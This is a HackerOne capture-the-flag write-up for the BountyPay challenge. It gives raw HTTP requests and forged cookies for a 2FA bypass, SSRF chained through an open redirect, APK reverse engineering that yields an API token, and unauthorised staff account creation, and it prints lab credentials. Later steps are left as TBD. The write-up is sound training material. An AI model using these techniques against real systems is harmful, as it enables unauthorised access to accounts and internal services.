{"id":894623,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQ2MjM=","url":"https://hackerone.com/reports/894623","title":"@shakedko H1-2006 CTF writeup","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-06-09T17:23:53.886Z","submitted_at":"2020-06-09T17:23:53.886Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"shakedko","url":"/shakedko","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ak1oSZijBCAPDuMVcNi2Mosb/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-07-06T16:02:31.016Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-06-19T16:11:07.639Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## TL;DR\n\nFlag is: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.\n\nThank you for this awesome challenge! \n\n## Introduction\n\nI have participated in this CTF as I wanted to see how far I'd be able to get considering the fact that I'm doing bug bounty for a relatively short time. \n\nComing from the software engineering world, I wanted to see how I'd be able to implement my thinking process and figure out as much as I can by myself.\n\n## Tools \n\nI have used several tools during this process. You may find these tools in the following links:\n\n- [ffuf](https://github.com/ffuf/ffuf) for fuzzing.\n- Word lists mainly from [SecLists] (https://github.com/danielmiessler/SecLists/). \n- [dex2jar](https://github.com/pxb1988/dex2jar)\n- [JD-GUI](http://java-decompiler.github.io/)\n- Android Studio\n- ngrok \n- [findomain](https://github.com/Edu4rdSHL/findomain)\n\n## Description \n\nHackerOne has [tweeted](https://twitter.com/Hacker0x01/status/1266454022124376064/photo/1) about the mentioned CTF on its Twitter account, describing what would be the end result once the CTF is done: \n\n\u003e We need your help! CEO \n@martenmickos\n needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us? https://hackerone.com/h1-ctf \n\nThis meant that until there wasn't a place to make a payment, the CTF wasn't over. This kept me on track as every time I finished a step,as  I knew that I was on the right track but there was still something to be found. \n\n## Steps\n\n\n- Reconnaissance (Subdomain Enumration, Understanding the Application, Content Discovery)\n- Open Redirect\n- Information Disclosure (Log File)\n- Improper Authorization\n- SSRF\n- Information Disclosure (Directory Listing, In-house APK)\n- Reverse Enginerring (APK)\n- Information Disclosure (Twitter Account)\n- Authentication Bypass (Creating Sandra's user)\n- CSRF\n- Parameter Pollution\n- Privilege Escalation via CSRF\n- Information Disclosure (CEO username \u0026 password)\n- SSRF\n- CSS Keylogger via SSRF\n\n### Step 1 - Reconnaissance \n\n#### Subdomain Enumartion\n\nThe scope `*.bountypay.h1ctf.com`, mentioned at https://hackerone.com/h1-ctf, made it clear that there are subdomains to be found, therefore the first thing I did was running a subdomain enumoration:\n\n```\n$ findomain -t bountypay.h1ctf.com\n\nTarget ==\u003e bountypay.h1ctf.com\n\nSearching in the Facebook API... üîç\nSearching in the Bufferover API... üîç\nSearching in the Threatminer API... üîç\nSearching in the AnubisDB API... üîç\nSearching in the CertSpotter API... üîç\nSearching in the Urlscan.io API... üîç\nSearching in the Threatcrowd API... üîç\nSearching in the Crtsh database API... üîç\nSearching in the Virustotal API... üîç\nSearching in the Sublist3r API... üîç\nSearching in the Spyse API... üîç\n\nstaff.bountypay.h1ctf.com\nsoftware.bountypay.h1ctf.com\napi.bountypay.h1ctf.com\napp.bountypay.h1ctf.com\nwww.bountypay.h1ctf.com\nbountypay.h1ctf.com\n\nA total of 6 subdomains were found for domain bountypay.h1ctf.com üëΩ in 2 seconds.‚è≤Ô∏è\n\nGood luck Hax0r üíÄ!\n```\n\n#### Understanding the Application \n\nI hit all the domains, learnt how and what existed, including texts, descriptions, assets such as js and css and so on. Once done, I continued with my recon by fuzzing `app.bountypay.h1ctf.com`.  \n\n#### Content Discovery\n\nAfter learning about the application and figuring which subdomains were available, I started to search for directories and files. This process gave me some fruits for later on, including: \n\n- GET https://app.bountypay.h1ctf.com/cgit \n- GET https://app.bountypay.h1ctf.com/.git\n- GET https://api.bountypay.h1ctf.com/api\n- GET https://api.bountypay.h1ctf.com/api/staff\n- GET https://api.bountypay.h1ctf.com//api/accounts/\u003cword\u003e\n\n### Step 2 - Open Redirect\n\nWhile doing my recon, I saw that https://api.bountypay.h1ctf.com as an open redirect on the main page: https://api.bountypay.h1ctf.com/redirect?url=... I knew that this would be useful later on so I kept it in my notes and moved to the next thing I found during my recon\n\n#### Step 3 - Information Disclosure (Log File)\n\nScanning the `cgit` directory mentioned above, under the content discovery recon, I found information disclosure exposing a .git repository: \n\n```\ncat httpsapp.bountypay.h1ctf.com-cgit-FUZZ.fuzz.json | jq '.results[]'\n{\n  \"input\": {\n    \"FUZZ\": \"config\"\n  },\n  \"position\": 97,\n  \"status\": 200,\n  \"length\": 278,\n  \"words\": 19,\n  \"lines\": 12,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/config\"\n}\n{\n  \"input\": {\n    \"FUZZ\": \"index\"\n  },\n  \"position\": 20,\n  \"status\": 200,\n  \"length\": 0,\n  \"words\": 1,\n  \"lines\": 1,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/index\"\n}\n{\n  \"input\": {\n    \"FUZZ\": \"description\"\n  },\n  \"position\": 3838,\n  \"status\": 200,\n  \"length\": 73,\n  \"words\": 10,\n  \"lines\": 2,\n  \"redirectlocation\": \"\",\n  \"url\": \"https://app.bountypay.h1ctf.com/cgit/description\"\n}\n```\n\nLooking into these files, I have found  https://app.bountypay.h1ctf.com/cgit/config exposed a github repository: https://github.com/bounty-pay-code/request-logger.git which contained one file [logger.php]() that showed me the way to the next step: \n\n```\n\u003c?php\n\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n````\n\n[https://app.bountypay.h1ctf.com/bp_web_trace.log](bp_web_trace.log) log file contained the following base64 decoded strings: \n\n```\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\nEncoding these strings resulted with the username, password, a hint about a 2FA challenge and a possible action within the app: \n\n```\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\n### Step 4 - Improper Authorization\n\nOnce I tried to login with the credentials that I found, aka `username: brian.oliver`, `password: V7h0inzX`, I saw a 2FA. \n\nLooking into the input fields in the HTML, I saw that the challenge and the challenge's answer were sent together within the same request. I had it clear that the challenge was hashed with md5, so I tried to use my own hash by using `md5 -s 1` which resulted with `c4ca4238a0b923820dcc509a6f75849b` and then I just used `1` in order to login, and it worked. The request looked like this:\n\n```\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Length: 101\nContent-Type: application/x-www-form-urlencoded\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=c4ca4238a0b923820dcc509a6f75849b\u0026challenge_answer=1\n```\n\nand the response: \n\n```\nHTTP/1.1 302 Found\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:14:12 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: keep-alive\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 09-Jul-2020 16:14:12 GMT; Max-Age=2592000\nLocation: /\nContent-Length: 0\n```\n\nUsing this new cookie, I was logged in as Brian Oliver.\n\n### Step 5 - SSRF\n\nAfter I bypassed the application's 2FA using Brain Oliver's credentials, I tried to play with the application's feature. The application had only one available feature which was suppose to show me the payment statements of the company, but trying to fetch this data resulted with nothing new. \n\nI looked into the request and I saw that it was doing the following request: \n\n```\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nAccept: */*\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://app.bountypay.h1ctf.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,he;q=0.8\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n\n```\n\nWhile returning the following response:\n\n```\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:17:38 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 177\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=01\u0026year=2020\",\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-01\\\",\\\"transactions\\\":[]}\"}\n```\n\nAt that point I also looked at the token cookie, which I got when I bypassed the 2FA. Once I decoded its base64, I figured that I might be able to change the request by using the cookie. \n\nThe cookie: `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` \nDecoded: `{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}` \n\nConsidering the fact that the `account_id` was available in both the cookie and the response from the request above, I tried to change it and see how it reacted. This is the point where I was finally able to use the open redirect that I have found on stage 2. \n\nI created a new cookie: `{\"account_id\":\"../../redirect?url=FUZZ\u0026\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}` and passed it to ffuf using a script that generated a wordlist and encoded all of the possible words in base64. My wordlist was a mix of two things: \n\n1. Known words and files\n2. Ideas I got while doing recon - one thing I figured during the recon was that the software.bountypay.h1ctf.com was only accessable from within the company's network and if I find an SSRF, together with the open redirect, I would have defintly checked it out. \n\nPutting everything together, I found a directory listing while fuzzing which leads me to the next step \n\n### Step 6 - Information Disclosure (Directory Listing, In-house APK)\n\nAs mentioned in the previous step, I got a hit while fuzzing through the SSRF by using the open redirect I have found earlier. The final request was as following: \n\n```\nGET /statements?month=01\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyYiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\n\n```\n\nand it's response gave me the hint for the next step: \n\n```\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:27:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 491\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/..\\/..\\/redirect?url=https:\\/\\/software.bountypay.h1ctf.com\\/uploads\\/\u0026\\/statements?month=01\u0026year=2020\",\"data\":\"\u003chtml\u003e\\n\u003chead\u003e\u003ctitle\u003eIndex of \\/uploads\\/\u003c\\/title\u003e\u003c\\/head\u003e\\n\u003cbody bgcolor=\\\"white\\\"\u003e\\n\u003ch1\u003eIndex of \\/uploads\\/\u003c\\/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\\\"..\\/\\\"\u003e..\\/\u003c\\/a\u003e\\n\u003ca href=\\\"\\/uploads\\/BountyPay.apk\\\"\u003eBountyPay.apk\u003c\\/a\u003e                                        20-Apr-2020 11:26              4043701\\n\u003c\\/pre\u003e\u003chr\u003e\u003c\\/body\u003e\\n\u003c\\/html\u003e\\n\"}\n```\n\nLooking at the JSON response, we can see that there was an APK file availble in /uploads/BountyPay.apk. Hitting the full URL https://software.bountypay.h1ctf.com/uplodas/ worked even for non authenticated users. \n\n### Step 7 - Reverse Enginerring (APK)\n\nWhen I see an APK or a target that has an APK I usually check its content by either unzipping it or disaassmbiling it. \n\nIn this case, I used dex2jar in order to create a .jar file which allowed me to read the code of the APK together with JD-GUI. \n\nOnce I had the code, I ran the APK using Android Studio's \"Profile or debug APK\". \n\nThere are plenty of hints within the code and the first one I followed was using the deep links. This helped me understand how to load the 3 different Android Activities: \n\n- one://part\n- two://part\n- three://part\n\nEach part had a required URI with different parameters that were available in the code. \n\nIn order to move from part one to part two, all I had to do was putting the following URL in the Launch Options: `one://part?start=PartTwoActivity` \n\n![APK-1 screenshot]\n\nI figured that I needed the `start=PartTwoActivity` together with a username as it was stated in the code: \n\n```\n    if (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n      String str = getIntent().getData().getQueryParameter(\"start\");\n      if (str != null \u0026\u0026 str.equals(\"PartTwoActivity\") \u0026\u0026 sharedPreferences.contains(\"USERNAME\")) {\n        ...\n        startActivity(new Intent((Context)this, PartTwoActivity.class));\n      } \n    } \n```\n\nOnce I was on the second Activity, I saw in the code that all inputs where invsible:\n\n```\n    EditText editText = (EditText)findViewById(2131230834);\n    Button button = (Button)findViewById(2131230794);\n    TextView textView = (TextView)findViewById(2131231002);\n    editText.setVisibility(4);\n    button.setVisibility(4);\n    textView.setVisibility(4\n```\n\nand all I had to do in order to make them visible was figuring out the params within the URL: \n\n```\n      Uri uri = getIntent().getData();\n      String str1 = uri.getQueryParameter(\"two\");\n      String str2 = uri.getQueryParameter(\"switch\");\n      if (str1 != null \u0026\u0026 str1.equals(\"light\") \u0026\u0026 str2 != null \u0026\u0026 str2.equals(\"on\")) {\n        editText.setVisibility(0);\n        button.setVisibility(0);\n        textView.setVisibility(0);\n      } \n```\n\nTherefore, the URL was: `two://part?two=light\u0026switch=on`. This resulted with a hash, an input field which asked for a header name. \n\n![Apk-2 Screenshot]\n\nWhile doing some recon, I already saw a suspicious base64 code in the 3rd Activity:\n\n```\n  byte[] decodedDirectory = Base64.decode(\"aG9zdA==\", 0);\n  \n  byte[] decodedDirectoryTwo = Base64.decode(\"WC1Ub2tlbg==\", 0);\n  \n  final String directory = \"aG9zdA==\";\n  \n  final String directoryTwo = \"WC1Ub2tlbg==\";\n  \n  final String headerDirectory = \"header\";\n````\n\nDecoding both resulted with the following strings: \n\n```\n$ \"WC1Ub2tlbg==\" | base64 -d\nX-Token: \n$ \"aG9zdA==\" | base64 -d\nhost\n```\n\nUsing the `X-Token` header I got to the 3rd Activity, which again had insvisible components: \n\n```\nprotected void onCreate(Bundle paramBundle) {\n    ...\n    final EditText editText = (EditText)findViewById(2131230837);\n    final Button button = (Button)findViewById(2131230796);\n    editText.setVisibility(4);\n    button.setVisibility(4);\n    ...\n```\n\nLooking into the code, I saw that there was an HTTP rqeuest that was supposed to be fired once everything had been loaded correctly: \n\n```\n    this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {\n            public void onCancelled(DatabaseError param1DatabaseError) {\n              Log.e(\"TAG\", \"onCancelled\", (Throwable)param1DatabaseError.toException());\n            }\n            \n            public void onDataChange(DataSnapshot param1DataSnapshot) {\n              String str = (String)param1DataSnapshot.getValue();\n              if (firstParam != null \u0026\u0026 decodedFirstParam.equals(\"PartThreeActivity\") \u0026\u0026 secondParam != null \u0026\u0026 decodedSecondParam.equals(\"on\")) {\n                String str1 = thirdParam;\n                if (str1 != null) {\n                  StringBuilder stringBuilder = new StringBuilder();\n                  stringBuilder.append(\"X-\");\n                  stringBuilder.append(str);\n                  if (str1.equals(stringBuilder.toString())) {\n                    editText.setVisibility(0);\n                    button.setVisibility(0);\n                    PartThreeActivity.this.thread.start();\n                  } \n                } \n              } \n            }\n          });\n    }\n```\n\nUsing the following URL: `three://part?switch=b24%3D\u0026three=UGFydFRocmVlQWN0aXZpdHk%3D\u0026header=X-Token` I was able to execute this code\n\n![Apk-3 Screenshot]\n\nI got the `HOST` header and the `X-Token` header in Android Studio's Logcat\n\n```\n2020-06-09 20:06:37.938 6261-6309/bounty.pay D/HOST¬†IS:: http://api.bountypay.h1ctf.com\n2020-06-09 20:06:37.939 6261-6309/bounty.pay D/TOKEN¬†IS:: 8e9998ee3137ca9ade8f372739f062c1\n2020-06-09 20:06:37.940 6261-6309/bounty.pay D/HEADER¬†VALUE¬†AND¬†HASH: X-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\n\n![Logcat Screenshot]\n\nIt's important to note that I didn't really have to open the APK in an emulator, as I could have edited the `user_created.xml` via `adb`. However, I wanted to actually see what I was facing with as it made it much more clear for me. \n\nThe last Activity had helped me to figure that there's more than just a token and a host. There were two more things that will be useful in the next two steps: \n\n1. There's a POST request to the exposed host, but something is missing. \n2. The twitter handle made me think that I might have missed something while doing my recon, so I got back to it and found that there was a new employe called Sandra.\n\n### Step 8 - Information Disclosure (Twitter Account)\n\nBountyPay's [Twitter account](https://twitter.com/BountypayHQ) [tweeted a welcome message](https://twitter.com/BountypayHQ/status/1258692286256500741) about a new employe. Looking for this employee, I found an interesting string which seemed like an ID: \nhttps://twitter.com/SandraA76708114/status/1258693001964068864/photo/1\n\n[Sandra's screenshot]\n\n### Step 9 - Authentication Bypass (Creating Sandra's user)\n\nAfter I saw APK POST request, host, X-Token I went back to my notes, as I remembered that there were few endpoints that I wasn't able to test. \n\nClearly, as Sandra was part of the staff, I first tried to hit `https://api.bountypay.h1ctf.com/api/staff` using the X-Token. This gave me an interesting result: \n\n```\nGET /api/staff? HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n\n```\n\nResponse\n```\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n````\n\nAfter I saw this, I tried to do the same with the following POST request: \n\n```\nPOST /api/staff?firstParam=UGFydFRocmVlQWN0aXZpdHk%3D HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:84DJKEIP38\n```\n\nBut that resutled with the following reponse: \n\n```\nHTTP/1.1 409 Conflict\nServer: nginx/1.14.0 (Ubuntu)\nDate: Wed, 03 Jun 2020 13:15:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 39\n\n[\"Staff Member already has an account\"]\n```\n\nNow I went back to Sandra's id and tried her `staff_id`: \n\n```\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 36\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:8FJ3KFISL3\u0026staff_name=1\n```\n\nResponse:\n\n```\nHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Wed, 03 Jun 2020 19:42:33 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 110\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\n### Step 10 - CSRF\n\nTBD \n### Step 11 - Parameter Pollution\nTBD \n### Step 12 - Privilege Escalation via CSRF\nTBD \n### Step 13 - Information Disclosure (CEO username \u0026 password)\nTBD \n### Step 14 - SSRF\nTBD \n### Step 15 - CSS Keylogger via SSRF\nTBD \n\n\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n  * [attachment / reference]\n\n## Impact\n\nTBD","vulnerability_information_html":"\u003ch2 id=\"tl-dr\"\u003eTL;DR\u003c/h2\u003e\n\n\u003cp\u003eFlag is: \u003ccode\u003e^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThank you for this awesome challenge! \u003c/p\u003e\n\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eI have participated in this CTF as I wanted to see how far I\u0026#39;d be able to get considering the fact that I\u0026#39;m doing bug bounty for a relatively short time. \u003c/p\u003e\n\n\u003cp\u003eComing from the software engineering world, I wanted to see how I\u0026#39;d be able to implement my thinking process and figure out as much as I can by myself.\u003c/p\u003e\n\n\u003ch2 id=\"tools\"\u003eTools\u003c/h2\u003e\n\n\u003cp\u003eI have used several tools during this process. You may find these tools in the following links:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fffuf%2Fffuf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003effuf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for fuzzing.\u003c/li\u003e\n\u003cli\u003eWord lists mainly from \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdanielmiessler%2FSecLists%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSecLists\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. \u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpxb1988%2Fdex2jar\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edex2jar\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fjava-decompiler.github.io%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eJD-GUI\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eAndroid Studio\u003c/li\u003e\n\u003cli\u003engrok \u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FEdu4rdSHL%2Ffindomain\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efindomain\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eHackerOne has \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1266454022124376064%2Fphoto%2F1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etweeted\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e about the mentioned CTF on its Twitter account, describing what would be the end result once the CTF is done: \u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eWe need your help! CEO \u003cbr\u003e\n\u003ca href=\"/martenmickos\"\u003e@martenmickos\u003c/a\u003e\u003cbr\u003e\n needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us? \u003ca title=\"https://hackerone.com/h1-ctf\" href=\"https://hackerone.com/h1-ctf\"\u003ehttps://hackerone.com/h1-ctf\u003c/a\u003e \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThis meant that until there wasn\u0026#39;t a place to make a payment, the CTF wasn\u0026#39;t over. This kept me on track as every time I finished a step,as  I knew that I was on the right track but there was still something to be found. \u003c/p\u003e\n\n\u003ch2 id=\"steps\"\u003eSteps\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eReconnaissance (Subdomain Enumration, Understanding the Application, Content Discovery)\u003c/li\u003e\n\u003cli\u003eOpen Redirect\u003c/li\u003e\n\u003cli\u003eInformation Disclosure (Log File)\u003c/li\u003e\n\u003cli\u003eImproper Authorization\u003c/li\u003e\n\u003cli\u003eSSRF\u003c/li\u003e\n\u003cli\u003eInformation Disclosure (Directory Listing, In-house APK)\u003c/li\u003e\n\u003cli\u003eReverse Enginerring (APK)\u003c/li\u003e\n\u003cli\u003eInformation Disclosure (Twitter Account)\u003c/li\u003e\n\u003cli\u003eAuthentication Bypass (Creating Sandra\u0026#39;s user)\u003c/li\u003e\n\u003cli\u003eCSRF\u003c/li\u003e\n\u003cli\u003eParameter Pollution\u003c/li\u003e\n\u003cli\u003ePrivilege Escalation via CSRF\u003c/li\u003e\n\u003cli\u003eInformation Disclosure (CEO username \u0026amp; password)\u003c/li\u003e\n\u003cli\u003eSSRF\u003c/li\u003e\n\u003cli\u003eCSS Keylogger via SSRF\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"step-1-reconnaissance\"\u003eStep 1 - Reconnaissance\u003c/h3\u003e\n\n\u003ch4 id=\"subdomain-enumartion\"\u003eSubdomain Enumartion\u003c/h4\u003e\n\n\u003cp\u003eThe scope \u003ccode\u003e*.bountypay.h1ctf.com\u003c/code\u003e, mentioned at 